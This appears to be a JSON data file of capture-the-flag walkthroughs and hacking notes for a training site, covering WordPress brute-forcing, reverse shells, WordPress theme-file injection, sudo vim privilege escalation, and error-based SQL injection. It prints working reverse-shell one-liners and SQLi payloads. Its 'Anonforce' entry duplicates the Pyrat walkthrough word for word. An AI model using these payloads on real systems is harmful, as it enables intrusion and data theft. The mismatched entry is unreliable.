[
  {
    "id": 1,
    "slug": "cold-box",
    "title": "ColdBox: Easy",
    "category": "walkthrough",
    "youtubeUrl": "https://www.youtube.com/watch?v=iIsBbtpn-u0",
    "blocksFile": "./blocks/cold-box.json",
    "goodbyeMessage": "Good luck, and happy hacking ðŸš€",
    "blocks": [
      {
        "type": "section_heading",
        "id": "initial-access",
        "text": "Initial Access"
      },
      {
        "type": "paragraph",
        "id": "nmap-intro",
        "text": "We start by scanning the target with Nmap."
      },
      {
        "type": "code_block",
        "id": "nmap-command",
        "language": "bash",
        "code": "nmap -p- -T4 -A -v 10.49.143.251"
      },
      {
        "type": "image",
        "id": "nmap-scan-screenshot",
        "src": "/assets/walkthroughs/chill-hack/nmap-result.png",
        "alt": "Nmap scan result"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "As we can see, we found two ports: `http` and `ssh`. Since `ssh` requires credentials, we will leave it for now and focus on `http`."
      },
      {
        "type": "section_heading",
        "id": "exploring-website",
        "text": "Further Enumeration"
      },
      {
        "type": "paragraph",
        "id": "further-enumeration",
        "text": "Then I started to dive deeper by exploring the website and performing directory searching."
      },
      {
        "type": "code_block",
        "id": "ffuf-command",
        "language": "bash",
        "code": "ffuf -u http://10.49.156.252/FUZZ -w /usr/share/wordlists/dirb/common.txt"
      },
      {
        "type": "image",
        "id": "ffuf-scan-screenshot",
        "src": "/assets/walkthroughs/chill-hack/directory-searching.png",
        "alt": "Directory scan result"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "There, I saw many directories, but only one was worth checking: `secret`. So I decided to take a look at it, and we also noticed that it is a WordPress site."
      },
      {
        "type": "image",
        "id": "website-enumeration",
        "src": "/assets/walkthroughs/chill-hack/website-enumeration.png",
        "alt": "Website enumeration"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "At this stage, we saw three usernames. Now we just need a password."
      },
      {
        "type": "section_heading",
        "id": "wp-scan",
        "text": "WordPress Scan"
      },
      {
        "type": "paragraph",
        "id": "wp-scan",
        "text": "As we already know it is a WordPress website, we will begin by exploring it with WPScan."
      },
      {
        "type": "code_block",
        "id": "wp-command",
        "language": "bash",
        "code": "wpscan --url http://10.49.172.12 -e ap,at,u"
      },
      {
        "type": "image",
        "id": "wp-scan-screenshot",
        "src": "/assets/walkthroughs/chill-hack/wp-scan.png",
        "alt": "WPScan result"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "Here, we can see multiple users: `hugo`, `c0ldd`, `philip`, and `the cold in person`. We will start with the most prominent ones, `hugo` and `c0ldd`, because we saw these usernames when we visited the website."
      },
      {
        "type": "section_heading",
        "id": "password-bruteforcing",
        "text": "Password Bruteforcing with Hydra"
      },
      {
        "type": "paragraph",
        "id": "password-bruteforcing",
        "text": "First, we will start with `hugo`."
      },
      {
        "type": "code_block",
        "id": "hydra-command",
        "language": "bash",
        "code": "hydra -l hugo -P /usr/share/wordlists/rockyou.txt 10.49.178.122 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'"
      },
      {
        "type": "paragraph",
        "id": "password-bruteforcing",
        "text": "After waiting for a couple of hours and getting nothing, I decided to switch to the next user, which is `c0ldd`."
      },
      {
        "type": "code_block",
        "id": "hydra-command",
        "language": "bash",
        "code": "hydra -l c0ldd -P /usr/share/wordlists/rockyou.txt 10.49.178.122 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'"
      },
      {
        "type": "image",
        "id": "password-found",
        "src": "/assets/walkthroughs/chill-hack/password.png",
        "alt": "Password found"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "With `c0ldd`, I found the password. Now we will use it to log in."
      },
      {
        "type": "section_heading",
        "id": "post-login",
        "text": "Post-Login Enumeration"
      },
      {
        "type": "paragraph",
        "id": "post-login",
        "text": "We will start by exploring the WordPress website after logging in. While exploring, I realized we need to get a shell by uploading a malicious payload. I used a reverse shell generator to generate a payload. You can use a one-liner reverse shell or a Pentest Monkey shell scriptâ€”itâ€™s up to you. I needed to be quick, so I used a one-liner reverse shell."
      },
      {
        "type": "code_block",
        "id": "reverse-shell-command",
        "language": "bash",
        "code": "sh -i >& /dev/tcp/IP/PORT 0>&1"
      },
      {
        "type": "paragraph",
        "id": "post-login",
        "text": "You need to add your `Local IP` and `PORT`. You can generate this command by going to this URL: https://www.revshells.com/"
      },
      {
        "type": "paragraph",
        "id": "post-login",
        "text": "Here is the UI you will see after logging in."
      },
      {
        "type": "image",
        "id": "ui",
        "src": "/assets/walkthroughs/chill-hack/website-overview.png",
        "alt": "Website overview"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "I clicked the `Editor` tab, and there I saw many pages. We can choose any page to inject our payload. I chose `content-none.php`, but you can use any page you like."
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "We encountered an issue: the script generated was for Bash, but we needed a PHP script. So I asked ChatGPT, and it gave me a PHP one-liner. You should understand the difference between different types of scripts."
      },
      {
        "type": "code_block",
        "id": "reverse-shell-command",
        "language": "bash",
        "code": "system(\"bash -c 'bash -i >& /dev/tcp/Local IP/PORT 0>&1'\");"
      },
      {
        "type": "image",
        "id": "reverse-shell",
        "src": "/assets/walkthroughs/chill-hack/rev-command.png",
        "alt": "Adding reverse shell"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "Before doing anything, you need to open your terminal and run the following command. This will open a listener."
      },
      {
        "type": "code_block",
        "id": "listener-command",
        "language": "bash",
        "code": "nc -lvnp 4444"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "With the listener set up, all you have to do is trigger that PHP file. In my case, I used the search PHP file, so all I had to do was type anything in the search bar, and it triggered that PHP file."
      },
      {
        "type": "section_heading",
        "id": "www-data-shell",
        "text": "Breaking into the System"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "With that, I got a shell, but it was `www-data`, so I had to escalate privileges."
      },
      {
        "type": "image",
        "id": "www-data-shell",
        "src": "/assets/walkthroughs/chill-hack/www-data-shell.png",
        "alt": "Got www-data shell"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "I ran `ls` in that path and saw a `wp-config.php` file. I obtained the username and password from it, then used SSH with that user and gained a proper user shell."
      },
      {
        "type": "image",
        "id": "ssh-shell",
        "src": "/assets/walkthroughs/chill-hack/ssh.png",
        "alt": "Got user shell"
      },
      {
        "type": "section_heading",
        "id": "user-flag",
        "text": "User Flag"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "Then I simply ran `ls` and got the user flag by printing the `user.txt` file."
      },
      {
        "type": "code_block",
        "id": "user-flag",
        "language": "bash",
        "code": "User Flag: [REDACTED]"
      },
      {
        "type": "section_heading",
        "id": "escalating-privilege",
        "text": "Privilege Escalation"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "Then I needed to gain a root shell, so I decided to type the most used command ever :)"
      },
      {
        "type": "code_block",
        "id": "sudo-command",
        "language": "bash",
        "code": "sudo -l"
      },
      {
        "type": "image",
        "id": "sudo-command-output",
        "src": "/assets/walkthroughs/chill-hack/sudo.png",
        "alt": "Sudo command output"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "Bingo! There, I saw that I could obtain a root shell in three ways. That means my user can run those three commands as root. I decided to try one of them and used `vim`."
      },
      {
        "type": "section_heading",
        "id": "gtfobins-root",
        "text": "Gaining Root Access with GTFOBins"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "I went to GTFOBins and searched for `vim`, where I found the command."
      },
      {
        "type": "code_block",
        "id": "gtfobins-command",
        "language": "bash",
        "code": "sudo vim -c '...'"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "I needed a root shell, and that command was incomplete, so all I had to do was append `:!bash`."
      },
      {
        "type": "code_block",
        "id": "gtfobins-command",
        "language": "bash",
        "code": "sudo vim -c ':!bash'"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "When I executed this command, I got a `root` shell, and then I simply printed the flag."
      },
      {
        "type": "code_block",
        "id": "root-flag",
        "language": "bash",
        "code": "Root Flag: [Redacted]"
      }
    ]
  },
  {
    "id": 2,
    "slug": "pyrat",
    "title": "Pyrat",
    "category": "walkthrough",
    "youtubeUrl": "https://youtu.be/ysZWgL-fduY",
    "blocksFile": "./blocks/pyrat.json",
    "goodbyeMessage": "Good luck, and happy hacking ðŸš€",
    "blocks": [
      {
        "type": "section_heading",
        "id": "initial-access",
        "text": "Initial Access"
      },
      {
        "type": "paragraph",
        "id": "nmap-intro",
        "text": "We start by scanning the target with Nmap."
      },
      {
        "type": "code_block",
        "id": "nmap-command",
        "language": "bash",
        "code": "nmap -p- -T4 -A -v 10.49.172.22"
      },
      {
        "type": "image",
        "id": "nmap-scan-screenshot",
        "src": "/assets/walkthroughs/pyrat/nmap.png",
        "alt": "Nmap scan result"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "As we can see, we found two ports: `http` and `ssh`. Since `ssh` requires credentials, we will leave it for now and focus on `http`."
      },
      {
        "type": "section_heading",
        "id": "further-enumeration",
        "text": "Further Enumeration"
      },
      {
        "type": "paragraph",
        "id": "further-enumeration",
        "text": "Then we visited website on the following url."
      },
      {
        "type": "code_block",
        "id": "url",
        "language": "bash",
        "code": "http://10.49.172.22:8000/"
      },
      {
        "type": "image",
        "id": "ui-scan-screenshot",
        "src": "/assets/walkthroughs/pyrat/basic-connection.png",
        "alt": "Nmap scan result"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "We can see it says, try a more basic conection so we will go with it and try to access it with a basic connection."
      },
      {
        "type": "code_block",
        "id": "url",
        "language": "bash",
        "code": "nc 10.49.172.22 8000"
      },
      {
        "type": "image",
        "id": "nc-scan-screenshot",
        "src": "/assets/walkthroughs/pyrat/python.png",
        "alt": "Nc scan result"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "As we can see we got something like shell but it can only execute python code so now in next step we will setup a reverse shell."
      },
      {
        "type": "section_heading",
        "id": "reverse-shell",
        "text": "Reverse Shell"
      },
      {
        "type": "paragraph",
        "id": "reverse-shell",
        "text": "Now we will setup reverse shell, so first we need python reverse shell so for this we will go to https://www.revshells.com "
      },
      {
        "type": "code_block",
        "id": "url",
        "language": "bash",
        "code": "import socket,os,pty;s=socket.socket();s.connect(('IP',PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "Remember to use your IP and PORT instead of the placeholders in the above command and before executing this open a listener in another tab by writing below command."
      },
      {
        "type": "code_block",
        "id": "url",
        "language": "bash",
        "code": "nc -lvnp PORT"
      },
      {
        "type": "image",
        "id": "shell-scan-screenshot",
        "src": "/assets/walkthroughs/pyrat/www-data.png",
        "alt": "Shell"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "So as we can see we gained intital foothold and now we will check files and look for something which can give us any user access."
      },
      {
        "type": "image",
        "id": "shell-scan-screenshot",
        "src": "/assets/walkthroughs/pyrat/shell.png",
        "alt": "Shell"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "After enumerating we got a config file and upon viewing it we got username and password."
      },
      {
        "type": "section_heading",
        "id": "ssh",
        "text": "SSH"
      },
      {
        "type": "paragraph",
        "id": "ssh-access",
        "text": "Now we will access into system via SSH and the credientials we got."
      },
      {
        "type": "code_block",
        "id": "url",
        "language": "bash",
        "code": "ssh user@10.49.172.22"
      },
      {
        "type": "image",
        "id": "shell-scan-screenshot",
        "src": "/assets/walkthroughs/pyrat/shell.png",
        "alt": "Shell"
      },
      {
        "type": "section_heading",
        "id": "user-flag",
        "text": "User Flag"
      },
      {
        "type": "paragraph",
        "id": "user-access",
        "text": "With this we access user flag."
      },
      {
        "type": "image",
        "id": "user-flag",
        "src": "/assets/walkthroughs/pyrat/userflag.png",
        "alt": "User flag"
      },
      {
        "type": "section_heading",
        "id": "root-flag",
        "text": "Root Flag"
      },
      {
        "type": "paragraph",
        "id": "root-access",
        "text": "Ok so for root flag we will start by checking out files first"
      },
      {
        "type": "image",
        "id": "user-flag",
        "src": "/assets/walkthroughs/pyrat/understanding.png",
        "alt": "User flag"
      },
      {
        "type": "paragraph",
        "id": "root-access",
        "text": "So here upon viewing gitconfig file we see it is referring to another directory which is /opt, so we will go there and check it."
      },
      {
        "type": "image",
        "id": "user-flag",
        "src": "/assets/walkthroughs/pyrat/file.png",
        "alt": "User flag"
      },
      {
        "type": "paragraph",
        "id": "root-access",
        "text": "So we restored a file and lets try to understand it."
      },
      {
        "type": "paragraph",
        "id": "root-access",
        "text": "So basically it is checking that if socket is admin or not so we know that we need to access it from admin and then we will write shell which will give us root shell, now will use a script which will bruteforce the password."
      },
      {
        "type": "image",
        "id": "user-flag",
        "src": "/assets/walkthroughs/pyrat/password.png",
        "alt": "User flag"
      },
      {
        "type": "paragraph",
        "id": "root-access",
        "text": "Now what we will do is to run this file, you can get this code from this url: https://github.com/Azid-ops/Important-Material---THM/blob/main/shell.py"
      },
      {
        "type": "image",
        "id": "user-flag",
        "src": "/assets/walkthroughs/pyrat/abc.png",
        "alt": "User flag"
      },
      {
        "type": "paragraph",
        "id": "root-access",
        "text": "So now we got the password and now remember admin is not any user but it is used in simple authentication so we just use that."
      },
      {
        "type": "image",
        "id": "root-flag",
        "src": "/assets/walkthroughs/pyrat/root.png",
        "alt": "Root flag"
      },
      {
        "type": "paragraph",
        "id": "root-access",
        "text": "With data we logged in with normal admin user, which was supported in basic authentication and we wrote shell we got this information from the file we got before and in last we got the flag, thats it."
      }
    ]
  },
  {
    "id": 3,
    "slug": "anon-force",
    "title": "Anonforce",
    "category": "walkthrough",
    "blocksFile": "./blocks/pyrat.json",
    "goodbyeMessage": "Good luck, and happy hacking ðŸš€",
    "youtubeUrl": "https://youtu.be/pN1WefcyaAI",
    "blocks": [
      {
        "type": "section_heading",
        "id": "initial-access",
        "text": "Initial Access"
      },
      {
        "type": "paragraph",
        "id": "nmap-intro",
        "text": "We start by scanning the target with Nmap."
      },
      {
        "type": "code_block",
        "id": "nmap-command",
        "language": "bash",
        "code": "nmap -p- -T4 -A -v 10.49.172.22"
      },
      {
        "type": "image",
        "id": "nmap-scan-screenshot",
        "src": "/assets/walkthroughs/pyrat/nmap.png",
        "alt": "Nmap scan result"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "As we can see, we found two ports: `http` and `ssh`. Since `ssh` requires credentials, we will leave it for now and focus on `http`."
      },
      {
        "type": "section_heading",
        "id": "further-enumeration",
        "text": "Further Enumeration"
      },
      {
        "type": "paragraph",
        "id": "further-enumeration",
        "text": "Then we visited website on the following url."
      },
      {
        "type": "code_block",
        "id": "url",
        "language": "bash",
        "code": "http://10.49.172.22:8000/"
      },
      {
        "type": "image",
        "id": "ui-scan-screenshot",
        "src": "/assets/walkthroughs/pyrat/basic-connection.png",
        "alt": "Nmap scan result"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "We can see it says, try a more basic conection so we will go with it and try to access it with a basic connection."
      },
      {
        "type": "code_block",
        "id": "url",
        "language": "bash",
        "code": "nc 10.49.172.22 8000"
      },
      {
        "type": "image",
        "id": "nc-scan-screenshot",
        "src": "/assets/walkthroughs/pyrat/python.png",
        "alt": "Nc scan result"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "As we can see we got something like shell but it can only execute python code so now in next step we will setup a reverse shell."
      },
      {
        "type": "section_heading",
        "id": "reverse-shell",
        "text": "Reverse Shell"
      },
      {
        "type": "paragraph",
        "id": "reverse-shell",
        "text": "Now we will setup reverse shell, so first we need python reverse shell so for this we will go to https://www.revshells.com "
      },
      {
        "type": "code_block",
        "id": "url",
        "language": "bash",
        "code": "import socket,os,pty;s=socket.socket();s.connect(('IP',PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "Remember to use your IP and PORT instead of the placeholders in the above command and before executing this open a listener in another tab by writing below command."
      },
      {
        "type": "code_block",
        "id": "url",
        "language": "bash",
        "code": "nc -lvnp PORT"
      },
      {
        "type": "image",
        "id": "shell-scan-screenshot",
        "src": "/assets/walkthroughs/pyrat/www-data.png",
        "alt": "Shell"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "So as we can see we gained intital foothold and now we will check files and look for something which can give us any user access."
      },
      {
        "type": "image",
        "id": "shell-scan-screenshot",
        "src": "/assets/walkthroughs/pyrat/shell.png",
        "alt": "Shell"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "After enumerating we got a config file and upon viewing it we got username and password."
      },
      {
        "type": "section_heading",
        "id": "ssh",
        "text": "SSH"
      },
      {
        "type": "paragraph",
        "id": "ssh-access",
        "text": "Now we will access into system via SSH and the credientials we got."
      },
      {
        "type": "code_block",
        "id": "url",
        "language": "bash",
        "code": "ssh user@10.49.172.22"
      },
      {
        "type": "image",
        "id": "shell-scan-screenshot",
        "src": "/assets/walkthroughs/pyrat/shell.png",
        "alt": "Shell"
      },
      {
        "type": "section_heading",
        "id": "user-flag",
        "text": "User Flag"
      },
      {
        "type": "paragraph",
        "id": "user-access",
        "text": "With this we access user flag."
      },
      {
        "type": "image",
        "id": "user-flag",
        "src": "/assets/walkthroughs/pyrat/userflag.png",
        "alt": "User flag"
      },
      {
        "type": "section_heading",
        "id": "root-flag",
        "text": "Root Flag"
      },
      {
        "type": "paragraph",
        "id": "root-access",
        "text": "Ok so for root flag we will start by checking out files first"
      },
      {
        "type": "image",
        "id": "user-flag",
        "src": "/assets/walkthroughs/pyrat/understanding.png",
        "alt": "User flag"
      },
      {
        "type": "paragraph",
        "id": "root-access",
        "text": "So here upon viewing gitconfig file we see it is referring to another directory which is /opt, so we will go there and check it."
      },
      {
        "type": "image",
        "id": "user-flag",
        "src": "/assets/walkthroughs/pyrat/file.png",
        "alt": "User flag"
      },
      {
        "type": "paragraph",
        "id": "root-access",
        "text": "So we restored a file and lets try to understand it."
      },
      {
        "type": "paragraph",
        "id": "root-access",
        "text": "So basically it is checking that if socket is admin or not so we know that we need to access it from admin and then we will write shell which will give us root shell, now will use a script which will bruteforce the password."
      },
      {
        "type": "image",
        "id": "user-flag",
        "src": "/assets/walkthroughs/pyrat/password.png",
        "alt": "User flag"
      },
      {
        "type": "paragraph",
        "id": "root-access",
        "text": "Now what we will do is to run this file, you can get this code from this url: https://github.com/Azid-ops/Important-Material---THM/blob/main/shell.py"
      },
      {
        "type": "image",
        "id": "user-flag",
        "src": "/assets/walkthroughs/pyrat/abc.png",
        "alt": "User flag"
      },
      {
        "type": "paragraph",
        "id": "root-access",
        "text": "So now we got the password and now remember admin is not any user but it is used in simple authentication so we just use that."
      },
      {
        "type": "image",
        "id": "root-flag",
        "src": "/assets/walkthroughs/pyrat/root.png",
        "alt": "Root flag"
      },
      {
        "type": "paragraph",
        "id": "root-access",
        "text": "With data we logged in with normal admin user, which was supported in basic authentication and we wrote shell we got this information from the file we got before and in last we got the flag, thats it."
      }
    ]
  },
  {
    "id": 3,
    "slug": "mysql-error-based",
    "title": "ERROR BASED SQLI - MYSQL",
    "category": "notes",
    "blocksFile": "./blocks/sql-error-based.json",
    "youtubeUrl": "https://youtu.be/agSq415rFEs",
    "goodbyeMessage": "Good luck, and happy hacking ðŸš€",
    "blocks": [
      {
        "type": "section_heading",
        "id": "initial-access",
        "text": "What is ERROR BASED SQLI injecton attack?"
      },
      {
        "type": "paragraph",
        "id": "error-based-sqli-definition",
        "text": "Error Based SQLI is a type of injection attack where we can get database content from errors, to test if a webApp is vulnerable or no we can run the following command."
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "http://www.test.com?id'"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "`'` if you use this and if you get mysql syntax error then bingo there is ERROR BASED injection in the web app."
      },
      {
        "type": "section_heading",
        "id": "initial-access",
        "text": "How to See the Database?"
      },
      {
        "type": "paragraph",
        "id": "error-based-sqli-definition",
        "text": "From its name it is quite obvious, we can see the content by triggering an error."
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "http://www.test.com?id=1 AND updatexml(1,concat(0x7e,database(),0x7e),1)"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "By running above command you will see the database name as expected"
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~sqli_one~'"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "Here we used updatexml function which will ofc give us the error and we concat the database name with ~ to be more visible, we use this function because it give us some content rather than just telling there is an error. So this function expects something like this updatexml(xml_target, xpath_expression, new_value) we used 1 and 1 in place of xml_target and new_value let's try to understand these paramteres."
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "xml_target: So basically this function expects first param to be an xml document so we just gave it 1 to generate an error."
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "xpath_expression: It is the basically the parameter which is ging to parse by the MYSQL."
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "new_value: So this is the thing which will happen after successful parsing so we wrote 1 because we don't need it, you can write any useless thing in first and last parameter."
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "Important Note: The first and last parameter can be anything which is a valid sql but not a valid xml because we want invalid xml so that it fails."
      },
      {
        "type": "section_heading",
        "id": "initial-access",
        "text": "Enumerate Tables"
      },
      {
        "type": "paragraph",
        "id": "error-based-sqli-definition",
        "text": "We have the database name so we will try to get the table names, you cannot get table names from basic sql syntax you need the below command to make it work."
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "http://www.test.com?id=1 AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema='sqli_one' LIMIT 0,1),0x7e),1)"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "So from above command you can see the table names of the database."
      },
      {
        "type": "section_heading",
        "id": "initial-access",
        "text": "Reading Columns"
      },
      {
        "type": "paragraph",
        "id": "error-based-sqli-definition",
        "text": "We have the table name, now we will ready it's column names, use the below command for that."
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "http://www.test.com?id=1 AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='article' LIMIT 0,1),0x7e),1)"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "This is pretty straight forward this will give you the column name"
      },
      {
        "type": "section_heading",
        "id": "initial-access",
        "text": "Reading Rows"
      },
      {
        "type": "paragraph",
        "id": "error-based-sqli-definition",
        "text": "We have the column name, now we can read that column data, from here you have everything so you can use normal msql query."
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "http://www.test.com?id=1 AND updatexml(1,concat(0x7e,(SELECT username FROM article LIMIT 0,1),0x7e),1)"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "This is also pretty straight forward this will give you the row data"
      }
    ]
  },
  {
    "id": 3,
    "slug": "postgres-error-based",
    "title": "ERROR BASED SQLI - POSTGRES",
    "category": "notes",
    "blocksFile": "./blocks/postgres-error-based.json",
    "youtubeUrl": "https://youtu.be/agSq415rFEs",
    "goodbyeMessage": "Good luck, and happy hacking ðŸš€",
    "blocks": [
      {
        "type": "section_heading",
        "id": "initial-access",
        "text": "What is ERROR BASED SQLI injecton attack?"
      },
      {
        "type": "paragraph",
        "id": "error-based-sqli-definition",
        "text": "Error Based SQLI is a type of injection attack where we can get database content from errors, to test if a webApp is vulnerable or no we can run the following command."
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "http://www.test.com?id=5' AND CAST((SELECT version()) AS int)-- -"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "If you use above command and if you get postgres syntax error then bingo there is ERROR BASED injection in the web app."
      },
      {
        "type": "section_heading",
        "id": "initial-access",
        "text": "How to See the Database?"
      },
      {
        "type": "paragraph",
        "id": "error-based-sqli-definition",
        "text": "From its name it is quite obvious, we can see the content by triggering an error."
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "http://www.test.com?id=1 AND CAST((SELECT current_database()) AS int)-- -"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "By running above command you will see the database name as expected"
      },
      {
        "type": "section_heading",
        "id": "initial-access",
        "text": "Enumerate Tables"
      },
      {
        "type": "paragraph",
        "id": "error-based-sqli-definition",
        "text": "We have the database name so we will try to get the table names, you cannot get table names from basic sql syntax you need the below command to make it work."
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "http://www.test.com?id=1 AND CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)-- -"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "So from above command you can see the table names of the database."
      },
      {
        "type": "section_heading",
        "id": "initial-access",
        "text": "Reading Columns"
      },
      {
        "type": "paragraph",
        "id": "error-based-sqli-definition",
        "text": "We have the table name, now we will ready it's column names, use the below command for that."
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "http://www.test.com?id=1' AND CAST((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1) AS int)-- -"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "This is pretty straight forward this will give you the column name"
      },
      {
        "type": "section_heading",
        "id": "initial-access",
        "text": "Reading Rows"
      },
      {
        "type": "paragraph",
        "id": "error-based-sqli-definition",
        "text": "We have the column name, now we can read that column data, from here you have everything so you can use normal postgres query."
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "http://www.test.com?id=1 AND CAST((SELECT username FROM article LIMIT 0,1) AS int)-- -"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "This is also pretty straight forward this will give you the row data"
      }
    ]
  },
  {
    "id": 3,
    "slug": "pgp",
    "title": "PGP DECRYPTION",
    "category": "notes",
    "blocksFile": "./blocks/pgp.json",
    "youtubeUrl": "https://youtu.be/pN1WefcyaAI",
    "goodbyeMessage": "Good luck, and happy hacking ðŸš€",
    "blocks": [
      {
        "type": "section_heading",
        "id": "initial-access",
        "text": "What is PGP?"
      },
      {
        "type": "paragraph",
        "id": "pgp-definition",
        "text": "PGP is use to decrypt and ecrypt a file"
      },
      {
        "type": "paragraph",
        "id": "pgp-definition",
        "text": "Encrytption: For encrypton developer generate a private and a public key, with public key it can encrypt any file and pass that key to others so that they can encrypt as well. A public key is like a padlock."
      },
      {
        "type": "paragraph",
        "id": "pgp-definition",
        "text": "Decryption: For decryption we need the same private key which developer created and he might stored that is some ascii file, so this private key is a key for that padlock."
      },
      {
        "type": "section_heading",
        "id": "initial-access",
        "text": "What is a ASCII file?"
      },
      {
        "type": "paragraph",
        "id": "error-based-sqli-definition",
        "text": "Well developer can hide an private key in an ascii file, and he could protect that ascii file as well, so in order to see pgp file we need to have private key which we can get from ascii."
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "Below are some commands to decrypt the pgp file"
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "gpg2john private.asc > gpg.hash"
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "john gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt"
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "gpg --import private.asc"
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "gpg --decrypt backup.pgp"
      },
      {
        "type": "paragraph",
        "id": "further-details",
        "text": "For a practical understanding of gpg or gpg kindly look at Anonforce walkthrough."
      }
    ]
  },
  {
    "id": 3,
    "slug": "suid",
    "title": "SUID BINARY ENUMERATION",
    "category": "notes",
    "blocksFile": "./blocks/suid-binary.json",
    "youtubeUrl": "https://youtu.be/uf8v-LugywU",
    "goodbyeMessage": "Good luck, and happy hacking ðŸš€",
    "blocks": [
      {
        "type": "section_heading",
        "id": "initial-access",
        "text": "What is a SUID binary?"
      },
      {
        "type": "paragraph",
        "id": "pgp-definition",
        "text": "SUID (Set User ID) is a special permission bit that allows a file to run with the privileges of its owner, not the user executing it."
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "find / -user root -perm -4000 -type f 2>/dev/null"
      },
      {
        "type": "paragraph",
        "id": "pgp-definition",
        "text": "The above command would list all binaries where SUID bit is set."
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "-rwsr-xr-x 1 root root 50000 Apr  2023 /usr/bin/python2.7"
      },
      {
        "type": "paragraph",
        "id": "pgp-definition",
        "text": "For example if you have a user azid and if he has the access to execute it, then it will be run with the privileges of its owner not from the person privileges who is executing it."
      },
      {
        "type": "section_heading",
        "id": "initial-access",
        "text": "Let's Break this command shall we?"
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "-type f"
      },
      {
        "type": "paragraph",
        "id": "pgp-definition",
        "text": "This says go ad match files but but but only match the regular files, dnt match folders, symlinks and etc just match regular files."
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "2>/dev/null"
      },
      {
        "type": "paragraph",
        "id": "pgp-definition",
        "text": "This 2> says that redirects error to output in short this command suppress errors if there is any error."
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
        "code": "-perm -4000"
      },
      {
        "type": "paragraph",
        "id": "pgp-definition",
        "text": "This says find any files with permission 4000, 4000 is suid in number terms."
      },
      {
        "type": "code_block",
        "id": "checking-command",
        "language": "bash",
